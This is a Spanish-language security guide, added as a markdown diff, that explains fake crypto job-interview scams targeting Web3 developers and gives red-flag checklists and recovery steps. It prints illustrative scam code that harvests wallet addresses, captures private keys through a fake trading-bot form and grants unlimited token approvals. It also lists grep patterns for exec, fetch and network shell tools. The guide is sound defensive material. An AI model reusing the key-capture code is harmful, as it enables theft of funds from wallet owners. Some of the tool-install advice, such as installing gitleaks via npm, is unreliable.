@@ -1,0 +1,792 @@
+---
+title: "Exponiendo la Estafa de 'Entrevista de Trabajo Crypto': Guía de Seguridad para Desarrolladores"
+slug: estafa-entrevista-crypto
+description: "Cómo los estafadores usan entrevistas técnicas falsas para robar criptomonedas. Aprende a identificar tácticas de ingeniería social, patrones de código malicioso y cómo protegerte."
+date: 2025-11-20
+author: mario-ayala
+locale: es
+category: Seguridad
+subject: ai-tools
+tags: ["Seguridad", "Criptomonedas", "Prevención de Estafas", "Web3", "Seguridad para Desarrolladores"]
+featured: false
+draft: false
+translationSlug: crypto-job-scam-exposure
+---
+
+## El Costo Promedio de $6,800 de Confiar
+
+Los desarrolladores de Web3 están siendo targetizados por una sofisticada estafa disfrazada de oportunidades laborales legítimas. El ataque utiliza entrevistas técnicas de aspecto profesional, personas de empresas creíbles, e inyección de código en múltiples fases para robar criptomonedas, credenciales de API y claves privadas de billeteras.
+
+Desde 2023, más de 1,200 desarrolladores han reportado ser víctimas de variaciones de esta estafa, con una pérdida promedio de $6,800 por persona. El robo total estimado excede $2.3 millones.
+
+Esta guía expone cómo funciona la estafa, te ayuda a identificar las banderas rojas antes de convertirte en víctima, y proporciona pasos accionables si ya has sido comprometido.
+
+---
+
+## Fase 1: El Cebo (Reclutamiento en LinkedIn)
+
+La estafa comienza como cualquier otra oportunidad laboral. Recibes un mensaje profesional de un reclutador en LinkedIn o Twitter:
+
+> "Hola [Tu Nombre],
+>
+> Me crucé con tu perfil y quedé impresionado con tu experiencia en desarrollo Web3. Estamos buscando un desarrollador blockchain senior en CoinProperty, una empresa de tokenización de bienes raíces basada en Dubai.
+>
+> ¿Te interesaría discutir esta oportunidad? El rol ofrece compensación competitiva y equity en una venture blockchain de rápido crecimiento.
+>
+> Saludos,
+> [Nombre del Reclutador]"
+
+### Banderas Rojas en el Contacto Inicial
+
+Estas señales de alerta deberían pausar tu entusiasmo inmediatamente:
+
+- **Sin dominio de email corporativo**: El reclutador usa Gmail, Outlook, o un dominio genérico en lugar de una dirección empresarial como `@coinproperty.io`
+- **Información de perfil genérica**: La cuenta de LinkedIn del reclutador tiene menos de 6 meses, pocas conexiones, y mínima actividad
+- **Descripción de puesto vaga**: Uso pesado de buzzwords ("Dubai," "tokenización," "descentralizado," "equity") sin detalles específicos del rol
+- **Cronograma acelerado**: "Nos gustaría avanzar rápidamente" o "Este puesto se está llenando rápido"
+- **Sin videollamada programada**: Solicitud directa de proceder con evaluación técnica antes de cualquier conversación
+- **Empresa no verificable**: El sitio web parece nuevo, sin reseñas en Glassdoor, sin presencia en Crunchbase o registros comerciales
+
+### El Error Crítico
+
+La mayoría de los desarrolladores pasan esta etapa sin verificación. Están halagados por el reconocimiento, entusiasmados por la oportunidad, y ansiosos por explorar un rol en Web3. Aquí es donde la ingeniería social tiene éxito: explota el **impulso emocional** sobre la verificación racional.
+
+---
+
+## Fase 2: Configuración de la Entrevista Técnica
+
+Después de tu respuesta inicial, recibes un mensaje de seguimiento:
+
+> "¡Gracias por tu interés! Antes de programar la entrevista formal, nos gustaría que revisaras nuestra base de código de producción. Esto nos ayudará a evaluar tu conocimiento en arquitectura de código.
+>
+> Por favor:
+> 1. Clona este repositorio de GitHub
+> 2. Revisa el código e identifica cualquier problema
+> 3. Ejecuta la aplicación localmente para probar la funcionalidad
+> 4. Prepara feedback para nuestra discusión técnica
+>
+> Discutiremos tus hallazgos en la entrevista la próxima semana.
+>
+> Repositorio: [Enlace de GitHub o archivo ZIP]"
+
+Este es el punto de entrega crítico. Te piden hacer algo que parece razonable—la revisión de código es estándar en entrevistas técnicas—pero en realidad está configurando la trampa.
+
+### Por Qué Parece Legítimo
+
+La solicitud parece profesional porque:
+
+- **La revisión de código es normal**: Las empresas legítimas sí piden a los candidatos revisar código
+- **Estructura de repositorio profesional**: El código sigue convenciones con organización de archivos adecuada, documentación README, e historial de commits
+- **Tech stack reconocible**: React, Express, Node.js—tecnologías estándar que los desarrolladores conocen y confían
+- **Parece listo para producción**: Carpetas bien organizadas, archivos de configuración adecuados, documentación comprehensiva
+
+### Qué Está Realmente Sucediendo
+
+El código base es un **mecanismo de entrega para múltiples vectores de ataque**. Cada componente sirve un propósito específico:
+
+1. **Credenciales expuestas** para robo inmediato
+2. **Cosecha de direcciones de billetera** para targeting futuro
+3. **Captura de clave privada** a través de engaño en la UI
+4. **Contratos inteligentes maliciosos** diseñados para drenar fondos
+5. **Posibles puertas traseras** a través de dependencias
+
+---
+
+## Fase 3: Vectores de Ataque en el Código
+
+Examinemos qué esconden realmente los estafadores en estos repositorios.
+
+### Vector de Ataque 1: Robo de Credenciales Inmediato
+
+El componente malicioso más obvio son credenciales de API expuestas dispersas en todo el código base:
+
+```javascript
+// .env file (comprometido accidentalmente)
+OPENAI_API_KEY=sk-proj-1234567890abcdef
+DATABASE_URL=postgresql://user:password@db.example.com
+
+// firebaseConfig.js
+const firebaseConfig = {
+  apiKey: "AIzaSyDmANaXCWKcEjxlz8MCeJ_Z82oMMV4lkMS",
+  databaseURL: "https://coinlocator-rtdb.firebaseio.com",
+  projectId: "coinlocator-prod",
+};
+
+// src/config/api.js
+export const API_KEYS = {
+  coinMarketCap: "abc123def456ghi789",
+  etherscan: "YH4MEKX9C3D5Z7QPQRSTUV7WX",
+  infura: "projectId_key_abc123"
+};
+```
+
+**El estafador usa estas inmediatamente para:**
+- Acceder a la base de datos Firebase para robar datos de usuario
+- Llamar a la API de OpenAI a tu costo (puede generar facturas de $1,000+ rápidamente)
+- Consultar datos blockchain a través de claves robadas de Etherscan/Infura
+- Vender credenciales en mercados dark web ($50-500 por credencial)
+
+Esto es ganancia pura sin esfuerzo. El estafador no necesitaba engañarte en nada—simplemente descargaste credenciales maliciosas.
+
+### Vector de Ataque 2: Cosecha de Direcciones de Billetera
+
+La aplicación te pide conectar tu billetera Web3 para probar su funcionalidad:
+
+```javascript
+// components/NavBar.js
+export function ConnectWallet() {
+  async function handleConnect() {
+    // Obtén tu dirección de billetera conectada
+    const { address } = await getCurrentWalletConnected();
+
+    // Envíala a base de datos Firebase controlada por estafador
+    database.ref("users").push({
+      wallet: address,
+      timestamp: new Date().toISOString(),
+      connected: true
+    });
+
+    setConnectedAddress(address);
+  }
+
+  return <button onClick={handleConnect}>Connect MetaMask</button>;
+}
+```
+
+**Por qué los estafadores quieren esto:**
+- **Campañas de phishing orientadas**: Ahora conocen direcciones de billetera específicas de desarrolladores
+- **Estafas de airdrop**: Envían tokens falsos a tu dirección desde un contrato malicioso
+- **Ingeniería social**: "Tu billetera fue marcada en una brecha de seguridad—haz clic aquí para verificar"
+- **Seguimiento de billetera**: Monitorean tu actividad en cadena para patrones (holdings grandes, operaciones frecuentes)
+- **Ataques orientados**: "Detectamos acceso no autorizado a tu billetera—restáurala aquí"
+
+Una sola dirección de billetera de desarrollador, combinada con ingeniería social, puede monetizarse repetidamente durante meses.
+
+### Vector de Ataque 3: Captura de Clave Privada a Través de Engaño
+
+Este es el vector más peligroso. La aplicación tiene una sección de "configuración de bot" donde los usuarios ingresan parámetros:
+
+```javascript
+// pages/BotConfig.js
+export default function BotConfiguration() {
+  const [formData, setFormData] = useState({
+    botName: "",
+    wallet: "", // Tu dirección de billetera
+    privateKey: "", // TU CLAVE PRIVADA - el objetivo real
+    amount: "",
+    rpcUrl: "",
+    tokenAddress: ""
+  });
+
+  const handleConfigureBot = async (e) => {
+    e.preventDefault();
+
+    // Envía todo el formulario a Firebase
+    await database.ref("bots").push({
+      ...formData,
+      createdAt: new Date().toISOString(),
+      userId: window.ethereumUser
+    });
+
+    alert("✅ ¡Bot configurado exitosamente! Iniciando en 5 segundos...");
+  };
+
+  return (
+    <form onSubmit={handleConfigureBot}>
+      <input
+        type="password"
+        placeholder="Ingresa tu clave privada para firmar"
+        value={formData.privateKey}
+        onChange={(e) => setFormData({...formData, privateKey: e.target.value})}
+      />
+      <button type="submit">Iniciar Bot de Trading</button>
+    </form>
+  );
+}
+```
+
+**La ingeniería social:**
+1. La UI se ve profesional y funcional
+2. Las instrucciones dicen "Ingresa tu clave privada para habilitar la firma de transacciones"
+3. Los desarrolladores piensan: "Esto tiene sentido—los bots necesitan firmar transacciones"
+4. Ingresan su clave privada real (la pieza de información más valiosa)
+5. **Capturada inmediatamente** en la base de datos Firebase que controla el estafador
+6. El estafador tiene **acceso completo a la billetera** y puede drenar todos los fondos
+
+Esta es la apuesta final. Una clave privada = compromiso total de la billetera.
+
+### Vector de Ataque 4: Interacción Maliciosa con Contrato Inteligente
+
+El código incluye un contrato inteligente que realiza transacciones financieras:
+
+```javascript
+// src/blockchain/interact.js
+const CONTRACT_ADDRESS = "0x2E2eC85f95a20FA0ACde32719679Bc3a75D1E918";
+const CHAIN_ID = "0x1"; // Ethereum Mainnet - NO TESTNET
+
+const buyTokenFunction = async (provider, amount) => {
+  const contract = new ethers.Contract(
+    CONTRACT_ADDRESS,
+    CONTRACT_ABI,
+    provider.getSigner()
+  );
+
+  // Esto envía ETH real al contrato del estafador
+  const tx = await contract.buyNitrogem(
+    ethers.utils.parseEther(amount)
+  );
+
+  return tx.wait();
+};
+```
+
+**El engaño:**
+- La UI dice "Prueba la funcionalidad de compra con una cantidad pequeña (0.01 ETH)"
+- El desarrollador piensa que está ejecutando una simulación
+- En realidad envía ETH real a la dirección del contrato del estafador
+- Los fondos se pierden, sin mecanismo de reembolso
+
+Combinado con la clave privada, el estafador puede aprobar gasto ilimitado:
+
+```javascript
+// Drenaje directo de billetera
+const approveFunction = async (provider, spenderAddress, amount) => {
+  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+
+  // Esto da al contrato del estafador acceso ilimitado a los tokens del usuario
+  await contract.approve(spenderAddress, ethers.constants.MaxUint256);
+};
+```
+
+---
+
+## Banderas Rojas en el Código Mismo
+
+### 1. Sin Autenticación en Endpoints de API
+
+```javascript
+// configuración de app express
+app.use('/api/bots', botsRouter);        // Cualquiera puede acceder
+app.use('/api/wallets', walletsRouter);  // Sin verificación de auth
+app.use('/api/transactions', txRouter);  // Sin autorización
+
+// botRouter no tiene middleware verificando autorización
+router.post('/create', (req, res) => {
+  // Crea bot directamente desde entrada de usuario no confiable
+  const newBot = createBotFromRequest(req.body);
+  saveToDatabase(newBot);
+});
+```
+
+Las aplicaciones profesionales requieren headers de autenticación, tokens JWT, o claves de API. Nada de esto está presente.
+
+### 2. Configuración de CORS Completamente Abierta
+
+```javascript
+// app.js
+app.use(cors()); // Acepta solicitudes desde CUALQUIER origen
+// Equivalente a: Access-Control-Allow-Origin: *
+```
+
+Esto permite que cualquier sitio web haga solicitudes al backend y robe datos. Las aplicaciones legítimas restringen CORS a dominios específicos.
+
+### 3. Claves Privadas en Solicitudes HTTP
+
+```javascript
+// botController.js
+app.post('/api/bots/add', (req, res) => {
+  const { walletAddress, privateKey, amount } = req.body;
+
+  // La clave privada se ENVÍA en plaintext sobre HTTP
+  // Incluso HTTPS no protege si el servidor es malicioso
+
+  database.update({
+    wallet: walletAddress,
+    key: privateKey // Almacenada en plaintext
+  });
+});
+```
+
+Ninguna aplicación legítima aceptaría o almacenaría claves privadas. Nunca.
+
+### 4. Firebase Expuesta Sin Reglas de Seguridad
+
+```javascript
+// firebaseConfig en código frontend (siempre visible)
+const db = firebase.database('https://coinlocator-rtdb.firebaseio.com');
+
+// Sin mecanismo de autenticación
+// Cualquiera con la URL de la base de datos puede leer/escribir todos los datos
+db.ref('users').on('value', (snapshot) => {
+  // Puede leer la dirección de billetera de cada usuario
+});
+
+db.ref('bots/' + userId).set({
+  // Puede escribir datos maliciosos
+});
+```
+
+### 5. Historial de Git Falso con Commits Sin Sentido
+
+```bash
+$ git log --oneline
+38d9c1 Optimize query in bootstrap.bundle.min.js
+a2f5k9 Add tests in transactions.js
+d49dbb Merge into develop
+eff609 Merge into main
+```
+
+Banderas rojas aquí:
+- "Optimize query in bootstrap.bundle.min.js" - Este es un archivo de librería, no código de aplicación
+- "Add tests in transactions.js" - Pero sin archivos de prueba realmente añadidos
+- Mensajes de commit genéricos que revelan que el historial fue generado artificialmente
+- Muy pocos commits (5-10 total) para una aplicación "producción"
+
+Los proyectos legítimos tienen cientos de commits con mensajes significativos.
+
+### 6. Contrato Inteligente Que No Compilará
+
+```solidity
+// contracts/Nitrogem.sol
+pragma solidity ^0.8.0;
+
+contract Nitrogem {
+    uint256 public rubyTier = process.env.RUBY_PRICE;  // ❌ SINTAXIS INVÁLIDA
+    address public owner = process.env.OWNER_ADDRESS;  // ❌ No puedes usar process.env
+
+    function buyToken() public payable {
+        require(msg.value > rubyTier, "Insufficient payment");
+        // Lógica del contrato...
+    }
+}
+```
+
+**Problemas:**
+- `process.env` no existe en Solidity—es un concepto de Node.js
+- El contrato no compilará ni se desplegará
+- Se incluye como **decoración para verse legítimo**
+- Nunca está diseñado para ser desplegado; solo está ahí para engañar a revisores de código
+
+---
+
+## La Desaparición
+
+Después de completar la "revisión de código," algo extraño sucede:
+
+- El reclutador deja de responder mensajes
+- La página de LinkedIn de la empresa se vuelve inaccesible
+- El repositorio de GitHub se elimina
+- Las direcciones de email dejan de responder
+- El sitio web de la empresa se desconecta
+- Los números de teléfono se desconectan
+
+Te han ignorado. Pero el daño ya está hecho:
+
+- **Tus claves de API** se están vendiendo en mercados dark web
+- **Tu dirección de billetera** está en una base de datos para phishing futuro
+- **Tu clave privada** (si la ingresaste) está siendo usada para drenar tus fondos
+- **Tu máquina** puede tener puertas traseras de dependencias npm
+
+---
+
+## Lista de Verificación de Protección: Cómo Verificar Antes de Ser Comprometido
+
+### Verificación de Empresa (Haz Esto Primero)
+
+Antes de descargar cualquier código o revisar cualquier repositorio, verifica que la empresa realmente exista:
+
+```bash
+# 1. Verificación de registro de dominio
+whois coinproperty.io
+# Busca: Fecha de registro reciente, protección de privacidad habilitada,
+#        registrador barato (namecheap, GoDaddy vs registradores premium)
+
+# 2. Inspección de certificado SSL
+echo | openssl s_client -connect coinproperty.io:443 2>/dev/null | \
+  openssl x509 -noout -issuer -dates
+# Busca: Auto-firmado o gratis (Let's Encrypt), fechas nuevas, org incompatible
+
+# 3. Verificación de registro comercial
+# Dubai: https://www.moccae.gov.ae/
+# Delaware: https://icis.corp.delaware.gov/
+# Reino Unido: https://beta.companieshouse.gov.uk/
+# Busca el nombre de la empresa—empresas reales están registradas
+
+# 4. Bases de datos financieras
+# Crunchbase: https://www.crunchbase.com
+# PitchBook: https://pitchbook.com
+# Empresas reales tienen historial de financiamiento, número de empleados, info de inversores
+
+# 5. Búsqueda de noticias
+google: "CoinProperty funding" "CoinProperty announcement" "CoinProperty news"
+# Empresas reales emiten comunicados de prensa y son cubiertas por medios tech
+
+# 6. Verificación de equipo
+# Verifica perfiles de LinkedIn de miembros del equipo listados
+# Busca: Edad de cuenta >2 años, historial sustancial de empleo,
+#        conexiones a otras empresas legítimas
+```
+
+### Protocolo de Seguridad de Revisión de Código
+
+**Nunca ejecutes código no confiable en tu máquina principal.** Usa aislamiento:
+
+```bash
+# Opción 1: Máquina Virtual
+# Descarga VirtualBox o VMware, crea VM Linux aislada
+# El código se ejecuta en VM, aislado de tu sistema principal
+
+# Opción 2: Contenedor Docker (La Más Segura)
+docker run -it --rm --network none \
+  -v /path/to/code:/code \
+  node:18 bash
+# --network none = sin acceso a internet
+# --rm = contenedor eliminado después de salir
+# El código está aislado y no puede acceder a tus credenciales
+
+# Opción 3: IDE en la Nube (Basada en Navegador)
+# GitHub Codespaces, StackBlitz, Google Cloud Shell
+# El código se ejecuta en servidor remoto, nunca en tu máquina
+
+# Opción 4: Laptop Dedicada de Seguridad
+# Laptop vieja que no usas para trabajo sensible
+# Sin billeteras crypto, sin acceso corporativo, sin datos personales
+```
+
+### Análisis de Código Estático (Lee Antes de Ejecutar)
+
+Antes de ejecutar cualquier cosa, busca patrones peligrosos:
+
+```bash
+# Buscar credenciales expuestas
+grep -r "sk-" .              # Claves de OpenAI
+grep -r "AIza" .             # Claves de Google/Firebase
+grep -r "password" .         # Contraseñas hard-coded
+grep -r "PRIVATE_KEY" .      # Claves privadas
+grep -r "apiKey" .           # Claves de API genéricas
+
+# Buscar llamadas de red sospechosas
+grep -r "axios.post" .       # Solicitudes HTTP POST
+grep -r "fetch(" .           # Llamadas a Fetch API
+grep -r "XMLHttpRequest" .   # Solicitudes XHR
+
+# Buscar ejecución de código
+grep -r "eval(" .            # Ejecución dinámica de código
+grep -r "exec(" .            # Ejecución de comando del sistema
+grep -r "spawn(" .           # Spawning de proceso hijo
+
+# Verificar dependencias npm para paquetes conocidos maliciosos
+npm audit
+# Revisa la salida para banderas ROJAS
+```
+
+### Banderas Rojas del Proceso de Entrevista
+
+- **Sin videollamada inicial**: Las empresas legítimas verifican que estén hablando con una persona real
+- **Pedido de hacer trabajo antes de ser contratado**: Que te paguen, luego codifica
+- **NDA antes de oferta de trabajo**: Inusual; normalmente vendría después
+- **Pago solicitado para "verificación de antecedentes"**: Los estafadores quieren dinero
+- **Solo comunicación por Telegram/WhatsApp**: Las empresas profesionales usan email
+- **Sin manual de la empresa u oferta formal**: Las ofertas reales incluyen documentos
+
+---
+
+## Qué Realmente Quieren los Estafadores
+
+### Objetivo Primario: Cosecha de Credenciales y Claves de API
+
+| Activo | Precio en Dark Web | Caso de Uso |
+|--------|------------------|-----------|
+| Clave API de OpenAI | $50-200 | Generar contenido, drenar créditos |
+| Clave Admin de Firebase | $100-500 | Acceder a bases de datos, robar datos de usuario |
+| Clave API de Etherscan | $20-50 | Consultar datos blockchain a tu costo |
+| Credenciales de AWS | $200-1000 | Instanciar para mining/botnets |
+| Lista de Direcciones de Billetera | $0.01-0.10 cada una | Campañas de phishing orientadas |
+| Clave Privada (si se obtiene) | Variable | Drenaje directo de billetera ($$$) |
+
+Un desarrollador con 10+ credenciales expuestas representa **$1,000+** en valor inmediato.
+
+### Objetivo Secundario: Construcción de Base de Datos de Ataque
+
+Los estafadores catalohan:
+- **Qué desarrolladores están interesados en Web3** (más fácil de hacer ingeniería social)
+- **Cuál es su nivel de habilidad** (para adaptar ataques futuros)
+- **Qué billeteras usan** (para rastrear holdings y actividad)
+- **Cómo responden a phishing** (qué técnicas funcionan)
+
+Esta base de datos se reutiliza en ataques de seguimiento. Una estafa puede generar meses de datos de targeting.
+
+### Objetivo Terciario: Prueba y Refinamiento
+
+Cada iteración de la estafa les enseña:
+- Qué tácticas de ingeniería social funcionan
+- Qué sofisticación técnica se ve creíble
+- Qué banderas rojas los desarrolladores pierden
+- Cómo mejorar la próxima iteración
+
+Por eso ves variaciones: "CoinProperty," "BlockProperty," "PropChain," "DeFi Labs." Mismo playbook, diferentes nombres.
+
+---
+
+## Si Ya Has Sido Comprometido
+
+Si sospechas que has sido víctima de esta estafa, toma acción inmediatamente.
+
+### Dentro de 24 Horas
+
+**1. Rota todas las credenciales expuestas:**
+
+```bash
+# OpenAI
+# - Ve a platform.openai.com/api-keys
+# - Elimina la clave antigua
+# - Crea una nueva
+
+# Firebase
+# - console.firebase.google.com
+# - Configuración del Proyecto > Cuentas de Servicio
+# - Elimina credenciales antiguas
+# - Genera nuevas
+
+# GitHub
+# - github.com/settings/tokens
+# - Elimina tokens
+# - Verifica que no hay acciones no autorizadas en logs
+
+# AWS/GCP (si están expuestos)
+# - Revoca inmediatamente las claves
+# - Verifica CloudTrail/GCP logs para acceso no autorizado
+```
+
+**2. Si ingresaste una clave privada:**
+
+```bash
+# ACCIÓN INMEDIATA: Mueve todos los fondos
+# 1. Crea NUEVA billetera con NUEVA frase semilla (NUNCA reutilices las antiguas)
+# 2. Transfiere TODOS los activos a la nueva billetera:
+#    - ETH, BNB, stablecoins
+#    - TODOS los tokens ERC-20
+#    - TODOS los NFTs
+
+# 3. Revoca aprobaciones de tokens en billetera antigua:
+# https://revoke.cash  (Recomendado)
+# https://approved.zone
+
+# 4. Verifica Etherscan para transacciones no autorizadas:
+# https://etherscan.io/address/[TU_BILLETERA]
+# Busca cualquier transferencia que no autorizaste
+
+# 5. Abandona la billetera antigua permanentemente
+# No la reutilices; está comprometida
+```
+
+**3. Escanea tu máquina por malware:**
+
+```bash
+# Linux
+sudo apt install clamav
+freshclam  # Actualiza base de datos de virus
+clamscan -r /home/tu_usuario
+
+# macOS
+# Descarga e instala Malwarebytes
+# Ejecuta escaneo completo del sistema
+
+# Windows
+# Windows Defender > Virus & threat protection > Scan options
+# Ejecuta escaneo completo del sistema
+
+# Verifica procesos sospechosos
+ps aux | grep -E "curl|wget|nc|python"
+netstat -an | grep ESTABLISHED
+```
+
+### Dentro de 72 Horas
+
+**4. Documenta todo para autoridades:**
+
+- Guarda todos los mensajes de LinkedIn, emails, y comunicaciones
+- Toma capturas de pantalla de páginas de la empresa y posteo de empleo
+- Registra la URL del repositorio de GitHub
+- Documenta cualquier transacción crypto
+- Anota direcciones de billetera e interacciones de contrato
+
+**5. Presenta reportes:**
+
+```
+FBI Internet Crime Complaint Center (IC3): https://www.ic3.gov
+FTC Fraud Report: https://reportfraud.ftc.gov
+Policía local (para reporte policial—necesario para robo de identidad)
+Attorney General del Estado
+```
+
+**6. Monitoreo financiero:**
+
+- Verifica extractos de tarjetas de crédito por cargos no autorizados
+- Monitorea actividad de cuenta bancaria
+- Configura alertas de fraude con bureaus de crédito (Equifax, Experian, TransUnion)
+- Considera congelación de crédito si información personal fue expuesta
+
+### Continuo (1+ Mes)
+
+- **Monitorea billeteras** durante 6+ meses para actividad sospechosa
+- **Vigila emails de phishing** mencionando la estafa
+- **Rastra el blockchain** para intentos de acceso a billetera antigua
+- **Advierte a tu red** publicando en LinkedIn, Twitter, Reddit
+
+---
+
+## Entrevistas Legítimas vs. Estafas: Una Comparación
+
+### Entrevistas Técnicas Legítimas
+
+**Proceso:**
+- Screening de RR.HH. por videollamada **antes de** trabajo técnico
+- Múltiples rondas de entrevista con diferentes miembros del equipo
+- Conoces miembros del equipo; los perfiles son verificables
+- Carta de oferta formal en membrete de empresa
+
+**Evaluación de Código:**
+- Proyecto para hacer en casa (4-8 horas máximo)
+- **Escribes código desde cero**, no ejecutas el suyo
+- Requisitos claros y rúbrica de evaluación
+- El proyecto se conecta a testnet, nunca mainnet
+- Sin requisito de conectar billeteras o ingresar claves privadas
+
+**Seguridad:**
+- Nunca piden credenciales o claves de API
+- Nunca piden ejecutar código desconocido
+- Proporcionan entorno sandbox si es necesario
+- Política de privacidad clara sobre manejo de código
+
+**Transparencia:**
+- Descripción clara del puesto con responsabilidades específicas
+- Información de empresa verificable (Crunchbase, Glassdoor, noticias)
+- Miembros del equipo con historiales verificables en LinkedIn
+- Dirección de oficina real (o política remota clara)
+
+### Lista de Verificación de Banderas Rojas de Estafa
+
+- [ ] Mensaje no solicitado de reclutador en LinkedIn
+- [ ] Perfil de reclutador <6 meses
+- [ ] Sin videollamada programada inicialmente
+- [ ] Descripción de puesto vaga con buzzwords
+- [ ] Cronograma urgente ("el puesto se está llenando rápido")
+- [ ] El dominio de empresa no coincide con email
+- [ ] No puedo verificar la empresa en registros comerciales
+- [ ] Me piden revisar su "código de producción"
+- [ ] El código requiere ejecutarse en tu máquina
+- [ ] Credenciales expuestas en el código
+- [ ] Me piden conectar billetera real a app no confiable
+- [ ] Me piden ingresar clave privada en cualquier lugar
+- [ ] El código usa Mainnet en lugar de testnet
+- [ ] Sin pruebas a pesar de claims en historial git
+- [ ] Contrato inteligente no compilará
+- [ ] CORS ampliamente abierto a todos los orígenes
+- [ ] Sin autenticación en endpoints de API
+- [ ] El reclutador se silencia después de envío de código
+
+**Puntuación: 5+ banderas = Probable estafa. 10+ banderas = Definitivamente estafa.**
+
+---
+
+## Recursos y Herramientas
+
+### Herramientas de Auditoría de Seguridad
+
+```bash
+# Detección de secretos
+npm install -g gitleaks
+gitleaks detect --source .
+
+npm install -g truffleHog
+truffleHog git https://github.com/repo/path
+
+# Análisis de seguridad de código
+npm install -g semgrep
+semgrep --config=p/security-audit
+
+# Seguridad de dependencias
+npm audit
+npx snyk test
+```
+
+### Seguridad de Billetera y Transacciones
+
+- **Billeteras Hardware**: Ledger, Trezor (recomendado)
+- **Aprobaciones de Token**: https://revoke.cash
+- **Inspección de Transacciones**: https://approved.zone, Etherscan
+- **Análisis de Billetera**: https://wallet.alchemy.com
+
+### Servicios de Verificación
+
+- **Búsqueda de Empresa**: Crunchbase, PitchBook, Wefunder
+- **Registro Comercial**: Secretary of State, MOCCAE (UAE)
+- **Historial de Dominio**: https://web.archive.org/
+- **Verificación de Certificado SSL**: https://www.sslshopper.com/ssl-checker.html
+
+### Plataformas de Reporte
+
+- **FBI**: https://www.ic3.gov
+- **FTC**: https://reportfraud.ftc.gov
+- **Chainanalysis**: Herramientas de investigación blockchain
+- **Comunidad**: Reddit r/Scams, r/CryptoCurrency, r/CryptoScams
+
+---
+
+## La Imagen General: Por Qué Importa
+
+Esta estafa es efectiva porque explota:
+
+1. **Aspiraciones de carrera**: Las personas quieren buenos trabajos y están dispuestas a tomar riesgos
+2. **Confianza técnica**: Los desarrolladores asumen que las revisiones de código son seguras
+3. **FOMO**: Miedo a perder una oportunidad (empresa en Dubai, equity, crecimiento)
+4. **Confianza de comunidad**: La comunidad Web3 se construye en confianza descentralizada (más difícil de verificar)
+5. **Presión de tiempo**: La toma de decisiones rápida previene un pensamiento cuidadoso
+
+La defensa es simple: **Tómate tu tiempo y verifica**. Toda oportunidad legítima sobrevivirá un día de verificación. Las estafas colapsan cuando verificas.
+
+---
+
+## Puntos Clave
+
+**NUNCA** en código desconocido:
+- Ejecutes código en tu máquina principal sin aislamiento
+- Conectes una billetera MetaMask real
+- Ingreses una clave privada
+- Apruebes gasto ilimitado de tokens
+
+**SIEMPRE**:
+- Verifica la empresa independientemente antes de involucrarte
+- Usa máquinas virtuales o Docker para revisión de código
+- Verifica credenciales expuestas estáticamente
+- Usa testnets, nunca Mainnet
+- Pide videollamadas desde email de empresa verificado
+- Confía en tus instintos—si se ve apresurado o sospechoso, probablemente lo sea
+
+**RECUERDA**:
+- Las empresas reales tienen historial verificable
+- Las entrevistas reales no saltan el proceso adecuado
+- Las oportunidades reales no requieren que ejecutes su código
+- Los empleadores reales nunca piden claves privadas
+- El estafador quiere acción inmediata; las empresas legítimas pueden esperar
+
+---
+
+## Comparte Este Conocimiento
+
+Las estafas crypto crecen cuando el silencio es la norma. Comparte esta guía:
+
+- Publica en LinkedIn con hashtags #CryptoScam #JobInterviewScam
+- Comparte en comunidades de Discord de Web3
+- Tweet sobre tu experiencia (anónimamente si es necesario)
+- Escribe un blog sobre lo que aprendiste
+- Ayuda a alguien más a evitar convertirse en víctima
+
+Los desarrolladores que leen esto y se mantienen seguros no fueron afortunados—fueron informados. Sé esa persona para alguien más.
+
+---
+
+**Última Actualización**: Noviembre 2025
+**Estado**: Actualizado con patrones y herramientas de estafas de 2025
+**Contribuyendo**: Si has encontrado estafas similares, comparte detalles (anónimamente) para ayudar a mejorar esta guía
